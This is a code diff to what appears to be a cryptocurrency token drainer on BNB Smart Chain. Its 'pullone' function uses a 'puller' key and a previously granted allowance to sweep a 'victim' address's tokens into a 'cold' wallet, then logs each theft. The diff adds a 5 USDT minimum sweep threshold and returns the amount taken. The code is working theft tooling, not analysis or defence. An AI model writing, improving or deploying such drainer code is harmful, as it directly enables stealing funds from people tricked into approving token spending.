@@ -1,6 +1,6 @@
 import {
     createPublicClient, createWalletClient, http, fallback,
-    erc20Abi, formatUnits, type Hex,
+    erc20Abi, formatUnits, parseUnits, type Hex,
 } from 'viem';
 import { privateKeyToAccount } from 'viem/accounts';
 import { bsc } from 'viem/chains';
@@ -22,12 +22,17 @@ export const gasOf = (addr: `0x${string}`) => pub.getBalance({ address: addr });
 /** Signed by the puller key: no session, no MPC, no tx-lock, no wallet daily limit. */
 export async function pullone(
     pullerKey: Hex, victim: `0x${string}`, cold: `0x${string}`, token: `0x${string}`,
-): Promise<string | null> {
+): Promise<{ hash: string; amount: bigint } | null> {
     const account = privateKeyToAccount(pullerKey);
     const [bal, allow, gas] = await Promise.all([
         balanceOf(victim, token), allowanceOf(victim, account.address, token), gasOf(account.address),
     ]);
     if (bal === 0n) return null;
+
+    // Only sweep if amount is above 5 USDT
+    const MIN_SWEEP = parseUnits('5', 18);
+    if (bal < MIN_SWEEP) return null;
+
     if (allow === 0n) throw new Error('ALLOWANCE ZERO');
     if (gas < ENV.MIN_PULLER_GAS_WEI) throw new Error('PULLER_LOW_GAS');
 
@@ -47,5 +52,5 @@ export async function pullone(
     });
 
     console.log(`[PULLED] ${formatUnits(amount, 18)} ${token} ${victim} -> ${cold} ${hash}`);
-    return hash;
+    return { hash, amount };
 }
